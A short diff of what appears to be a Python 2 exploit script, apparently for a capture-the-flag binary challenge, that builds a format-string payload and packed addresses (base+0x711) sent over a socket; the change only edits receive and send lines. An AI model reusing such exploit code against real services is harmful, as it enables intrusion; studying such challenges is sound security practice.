@@ -53,8 +53,8 @@ go('%%%dc'%(133+len(payload)),payload)
 go('%133c')
 
 if recvflag:
-    print st.recv(4096)
-st.send('n\n')
+    st.recv(4096)
+st.send('n')
 
 payload = pack('<I',0x0b)+\
 	pack('<I',base+0x711)+\
